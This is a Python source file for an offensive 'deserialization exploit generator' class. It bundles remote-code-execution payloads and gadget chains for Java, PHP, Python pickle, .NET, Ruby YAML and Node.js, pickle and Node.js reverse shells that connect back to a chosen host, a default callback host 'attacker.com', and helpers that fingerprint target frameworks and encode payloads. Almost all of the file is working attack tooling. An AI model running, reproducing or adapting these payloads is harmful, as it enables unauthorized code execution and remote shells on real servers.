"""
Advanced Deserialization Exploit Generator
Generates payloads for various deserialization vulnerabilities
"""
import base64
import json
import pickle
import struct
from typing import Dict, List, Any, Optional
import zlib

class DeserializationExploiter:
    """Advanced deserialization exploit generator"""
    
    def __init__(self, target: str, callback_server: str = None):
        self.target = target
        self.callback_server = callback_server or "attacker.com"
        
        self.gadget_chains = {
            "java": self._java_gadgets(),
            "php": self._php_gadgets(),
            "python": self._python_gadgets(),
            "dotnet": self._dotnet_gadgets(),
            "ruby": self._ruby_gadgets(),
            "nodejs": self._nodejs_gadgets()
        }
    
    def _java_gadgets(self) -> Dict[str, str]:
        """Java deserialization gadget chains"""
        return {
            "CommonsCollections1": {
                "description": "Apache Commons Collections <= 3.2.1",
                "command_template": "java -jar ysoserial.jar CommonsCollections1 '{cmd}'",
                "detection": "org.apache.commons.collections",
                "payload_hint": "rO0ABX..."
            },
            "CommonsCollections5": {
                "description": "Apache Commons Collections 3.1-3.2.1",
                "command_template": "java -jar ysoserial.jar CommonsCollections5 '{cmd}'",
                "detection": "BadAttributeValueExpException"
            },
            "CommonsCollections6": {
                "description": "Apache Commons Collections 3.1",
                "command_template": "java -jar ysoserial.jar CommonsCollections6 '{cmd}'"
            },
            "CommonsBeanutils1": {
                "description": "Apache Commons Beanutils",
                "command_template": "java -jar ysoserial.jar CommonsBeanutils1 '{cmd}'"
            },
            "Spring1": {
                "description": "Spring Framework beans",
                "command_template": "java -jar ysoserial.jar Spring1 '{cmd}'"
            },
            "JBossInterceptors1": {
                "description": "JBoss Interceptors",
                "command_template": "java -jar ysoserial.jar JBossInterceptors1 '{cmd}'"
            },
            "Hibernate1": {
                "description": "Hibernate ORM",
                "command_template": "java -jar ysoserial.jar Hibernate1 '{cmd}'"
            },
            "JRMP": {
                "description": "JRMP Client for bypassing",
                "command_template": "java -jar ysoserial.jar JRMPClient '{listener}:{port}'"
            }
        }
    
    def _php_gadgets(self) -> Dict[str, Any]:
        """PHP deserialization gadget chains"""
        return {
            "Monolog_RCE": {
                "description": "Monolog RCE via Guzzle",
                "payload": 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:{len}:"{cmd}";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:0:{}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}',
                "detection": "Monolog"
            },
            "Laravel_RCE": {
                "description": "Laravel PendingBroadcast RCE",
                "payload": 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"*queueResolver";s:6:"system";}s:8:"*event";s:{len}:"{cmd}";}',
                "detection": "Illuminate"
            },
            "Guzzle_RCE": {
                "description": "Guzzle FnStream RCE",
                "payload": 'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"GuzzleHttp\\Psr7\\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\\HandlerStack":3:{s:32:"GuzzleHttp\\HandlerStackhandler";s:{len}:"{cmd}";s:30:"GuzzleHttp\\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}'
            },
            "Symfony_RCE": {
                "description": "Symfony Process RCE",
                "payload": "O:47:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"Symfony\\Component\\Process\\Pipes\\WindowsPipesfiles\";a:1:{i:0;O:32:\"Symfony\\Component\\Finder\\Finder\":0:{}}}",
                "detection": "Symfony"
            },
            "WordPress_POP": {
                "description": "WordPress Object Injection",
                "payload": 'a:2:{i:0;O:8:"stdClass":0:{}i:1;s:{len}:"{cmd}";}',
                "detection": "WordPress"
            }
        }
    
    def _python_gadgets(self) -> Dict[str, Any]:
        """Python pickle deserialization payloads"""
        
        class RCE:
            def __reduce__(self):
                import os
                return (os.system, ("id",))
        
        return {
            "os_system": {
                "description": "Basic os.system RCE",
                "generator": lambda cmd: base64.b64encode(
                    b"cos\nsystem\n(S'" + cmd.encode() + b"'\ntR."
                ).decode(),
                "raw": "cos\nsystem\n(S'{cmd}'\ntR."
            },
            "subprocess": {
                "description": "subprocess.Popen RCE",
                "generator": lambda cmd: base64.b64encode(
                    b"csubprocess\nPopen\n((S'" + cmd.encode() + b"'\nI1\ntR."
                ).decode()
            },
            "builtins_exec": {
                "description": "exec() arbitrary code execution",
                "raw": "(S'import os; os.system(\"{cmd}\")'\nS'exec'\nu."
            },
            "reverse_shell": {
                "description": "Reverse shell payload",
                "generator": lambda host, port: base64.b64encode(
                    f"cos\nsystem\n(S'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{host}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"bash\\\",\\\"-i\\\"])\"'\ntR.".encode()
                ).decode()
            }
        }
    
    def _dotnet_gadgets(self) -> Dict[str, Any]:
        """".NET deserialization gadgets"""
        return {
            "ObjectDataProvider": {
                "description": "ObjectDataProvider gadget",
                "payload": """<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
                    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                    xmlns:System="clr-namespace:System;assembly=mscorlib"
                    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
                    <ObjectDataProvider.MethodParameters>
                        <System:String>/c {cmd}</System:String>
                    </ObjectDataProvider.MethodParameters>
                    <ObjectDataProvider.ObjectInstance>
                        <Diag:Process>
                            <Diag:Process.StartInfo>
                                <Diag:ProcessStartInfo FileName="cmd"/>
                            </Diag:Process.StartInfo>
                        </Diag:Process>
                    </ObjectDataProvider.ObjectInstance>
                </ObjectDataProvider>""",
                "detection": "BinaryFormatter"
            },
            "TypeConfuseDelegate": {
                "description": "TypeConfuseDelegate chain",
                "command_template": "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c '{cmd}'"
            },
            "TextFormattingRunProperties": {
                "description": "TextFormattingRunProperties gadget",
                "command_template": "ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c '{cmd}'"
            },
            "PSObject": {
                "description": "PSObject for PowerShell deserialization",
                "command_template": "ysoserial.exe -f BinaryFormatter -g PSObject -c '{cmd}'"
            }
        }
    
    def _ruby_gadgets(self) -> Dict[str, Any]:
        """Ruby deserialization gadgets (Marshal/YAML)"""
        return {
            "ERB_template": {
                "description": "ERB template injection via YAML",
                "payload": """--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: {cmd}
       method_id: :resolve"""
            },
            "Universal_RCE": {
                "description": "Universal Ruby RCE via YAML",
                "payload": """--- !ruby/hash:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source
    uri: "| {cmd}"
  type: :runtime"""
            }
        }
    
    def _nodejs_gadgets(self) -> Dict[str, Any]:
        """Node.js deserialization gadgets"""
        return {
            "node_serialize": {
                "description": "node-serialize RCE",
                "payload": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'{cmd}\',function(error,stdout,stderr){console.log(stdout)})}()"}',
                "detection": "node-serialize"
            },
            "js_yaml": {
                "description": "js-yaml unsafe load",
                "payload": "!!js/function 'function(){return require(\"child_process\").execSync(\"{cmd}\").toString()}'",
                "detection": "js-yaml"
            },
            "serialize_javascript": {
                "description": "serialize-javascript RCE",
                "payload": '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("bash",[]);var client=new net.Socket();client.connect({port},"${host}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()',
            }
        }
    
    def generate_payload(self, language: str, gadget: str, command: str) -> Optional[str]:
        """Generate deserialization payload for given language and gadget"""
        if language not in self.gadget_chains:
            return None
        
        gadgets = self.gadget_chains[language]
        if gadget not in gadgets:
            return None
        
        gadget_info = gadgets[gadget]
        
        if "payload" in gadget_info:
            payload = gadget_info["payload"]
            payload = payload.replace("{cmd}", command)
            payload = payload.replace("{len}", str(len(command)))
            return payload
        elif "generator" in gadget_info:
            return gadget_info["generator"](command)
        elif "raw" in gadget_info:
            return gadget_info["raw"].replace("{cmd}", command)
        elif "command_template" in gadget_info:
            return gadget_info["command_template"].replace("{cmd}", command)
        
        return None
    
    def detect_framework(self, headers: Dict, content: str) -> List[str]:
        """Detect potential frameworks vulnerable to deserialization"""
        detections = []
        
        java_indicators = ["JSESSIONID", "java", "servlet", "spring", "struts", "jboss"]
        php_indicators = ["PHPSESSID", "laravel", "symfony", "wordpress", "drupal"]
        python_indicators = ["python", "django", "flask", "pickle", "marshal"]
        dotnet_indicators = [".aspx", "viewstate", "__VIEWSTATE", "asp.net"]
        ruby_indicators = ["ruby", "rails", "_session_id"]
        nodejs_indicators = ["express", "connect.sid", "node"]
        
        combined = str(headers).lower() + content.lower()
        
        if any(ind in combined for ind in java_indicators):
            detections.append("java")
        if any(ind in combined for ind in php_indicators):
            detections.append("php")
        if any(ind in combined for ind in python_indicators):
            detections.append("python")
        if any(ind in combined for ind in dotnet_indicators):
            detections.append("dotnet")
        if any(ind in combined for ind in ruby_indicators):
            detections.append("ruby")
        if any(ind in combined for ind in nodejs_indicators):
            detections.append("nodejs")
        
        return detections
    
    def get_all_payloads(self, language: str, command: str) -> List[Dict]:
        """Get all payloads for a specific language"""
        if language not in self.gadget_chains:
            return []
        
        results = []
        for gadget_name, gadget_info in self.gadget_chains[language].items():
            payload = self.generate_payload(language, gadget_name, command)
            results.append({
                "gadget": gadget_name,
                "description": gadget_info.get("description", ""),
                "payload": payload,
                "detection": gadget_info.get("detection", "")
            })
        
        return results
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """Encode payload in various formats"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            from urllib.parse import quote
            return quote(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "gzip_base64":
            compressed = zlib.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        return payload
